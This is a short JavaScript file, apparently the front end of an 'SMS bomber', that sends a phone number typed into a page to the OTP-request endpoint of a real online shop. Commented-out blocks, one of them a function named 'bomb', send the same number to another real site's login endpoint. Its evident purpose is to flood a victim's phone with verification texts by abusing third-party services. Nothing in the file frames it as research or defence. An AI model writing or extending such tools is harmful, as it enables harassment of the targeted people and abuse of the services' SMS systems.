const btn_send = document.getElementById("btn_send");
const number = document.getElementById("number").value;


btn_send.addEventListener("click", () => {
    const numberInput = document.getElementById("number").value;

    const xhr = new XMLHttpRequest();
    const data = `mobile=${encodeURIComponent(numberInput)}`;

    xhr.open("POST", "https://auth.basalam.com/otp-request", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onload = () => {
        alert("کد وضعیت:", xhr.status);
        alert("پاسخ سرور:", xhr.responseText);
    };

    xhr.onerror = () => {
        document.getElementById("status_server").innerText = "ارسال شد";     
    };

    xhr.send(data);
});

// btn_send.addEventListener("click", () => { 
//     const numberInput = document.getElementById("number").value;

//     const xhr1 = new XMLHttpRequest();
//     const data1 = `username=${encodeURIComponent(numberInput)}`;
    
//     xhr1.open("POST", "https://bimebazar.com/accounts/api/login_sec/", true);
//     xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

//     xhr1.onload = () => {
//         alert("کد وضعیت:", xhr1.status);
//         alert("پاسخ سرور:", xhr1.responseText);
//     };

//     xhr1.onerror = () => {
//         document.getElementById("status_server").innerText = "ارسال شد";     
//     };

//     xhr1.send(data1);
// });

// function bomb(){
//     const numberInput = document.getElementById("number").value;


//     fetch("https://bimebazar.com/accounts/api/login_sec/",{
//         method:"POST",
//         headers:{
//             "Content-Type":"application/x-www-form-urlencoded",            
//           },
//           body: new URLSearchParams({ username: numberInput })
//     })
//     .then(res => {
//       console.log("status:", res.status);
//       return res.text()
//     })
//     .then(data => {
//       console.log("پاسخ سرور:", data);
//     })

// }

// btn_send.addEventListener("click",bomb);